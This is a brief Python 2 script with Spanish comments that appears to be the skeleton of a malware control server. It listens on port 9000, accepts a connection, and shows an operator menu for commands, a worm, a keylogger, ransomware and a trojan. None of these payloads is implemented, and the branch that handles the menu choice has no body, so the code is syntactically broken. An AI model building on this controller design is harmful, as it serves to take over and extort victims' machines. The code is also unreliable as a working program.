# -*- coding: UTF-8 -*-
#Servidor basico
#Escucha en el puerto 9000 a las conexiones y las acepta
try:
	from socket import *
	s = socket(AF_INET,SOCK_STREAM)
	#Inicia con todas las direcciones (o a la que le indicamos s.bind('127.0.0.1',9000)) en el puerto que indicamos
	s.bind(("",9000))
	#Escucha 5 conexiones como máximo
	s.listen(5)
	
	
	#Esto es una pareja
	#C es el socket object
	#A es la dirección y puerto ("127.0.0.1",60542)
	c,a = s.accept()
	
	
	#Luego muestra por pantalla quién se ha conectado
	print 'Received connection from ', a
	
	
	#OPCIONES DESDE EL SERVIDOR:
	opcion = str(raw_input('Inserte uno de los siguientes valores para ejecutar la opción que desea:\n0 - Commands\n1 - Worm\n2 - Keylogger\n3 - Ransomware\n4 - Trojan\n quit - Exit\n'))
	
	
	#OPCIONES ELEGIDAS. SI ES UNA DE LAS MARCADAS, ENTONCES:
	if opcion == '1' or opcion == '2' or opcion == '3' or opcion == '4' or opcion == 'quit':
	
	#EN CASO DE QUE LA OPCIÓN ELEGIDA NO EXISTA:
	else:
		print 'La opción no es ni 1, ni 2, ni 3, ni 4, ni "quit"'
	
	
except:
	print 'Se cortó la conexión.'
